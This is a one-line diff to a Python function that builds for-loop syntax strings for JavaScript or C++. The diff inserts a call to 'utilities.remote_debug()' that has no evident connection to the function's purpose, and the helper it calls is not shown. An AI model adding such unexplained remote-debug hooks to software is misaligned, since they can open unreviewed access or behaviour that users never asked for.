@@ -372,6 +372,7 @@ def format_ecma_loop(looptype, text, condition, increment):
         i = str(increment)
         if i == "":
             i = "++"
+        utilities.remote_debug()
         if config_settings["javascript"]:
             language_dependent = "for (var " + letter + " = PARAMETER; " + letter + " " + c + " PARAMETER; " + letter + i + "){}"
         elif config_settings["C plus plus"]:
